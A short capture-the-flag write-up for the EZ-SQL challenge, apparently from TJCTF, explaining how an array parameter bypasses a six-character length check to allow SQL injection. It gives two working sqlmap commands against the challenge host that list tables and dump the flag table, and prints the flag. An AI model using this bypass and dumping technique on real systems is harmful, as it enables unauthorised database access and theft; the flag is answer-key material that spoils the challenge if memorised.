# EZ-SQL

**The challenge**

In the challenge if you give a number which have numbers with characters more than 2 and less than 6 characters It will give back a joke.

**The Exploit**

The source file contained only a js file which uses sql. Here it was vulnerable to sqll injection but the parameter can only be be of length 6 characters.

The trick was that here it had the code
```js
    app.use(express.urlencoded({ extended: true }));
```
This basically meant that an array value can be passed through. So the length of the value of an array will be like
```
    a = [adi , hi]
```
Here the length will be 2

So we can pass a whole sql injection inside an array.
Then it can be automated with sqlmap because the table's name was like *flag_${uuid.v4().replace(/-/g, '_')}*. Then got the flag.

sqlmap --url "https://ez-sql-c74146f3232854b3.tjc.tf/search?name[0]=hai&name[1]=buddy" -p "name[0]" --dbms=sqlite --tables --technique=U

sqlmap --url "https://ez-sql-c74146f3232854b3.tjc.tf/search?name[0]=hai&name[1]=buddy" -p "name[0]" --dbms=sqlite -T flag_187998e1_b2a0_43c7_a135_53b1b9e03e5d --dump --technique=U

**The Flag**
Flag = tjctf{ezpz_l3mon_squ33zy_603f8e08}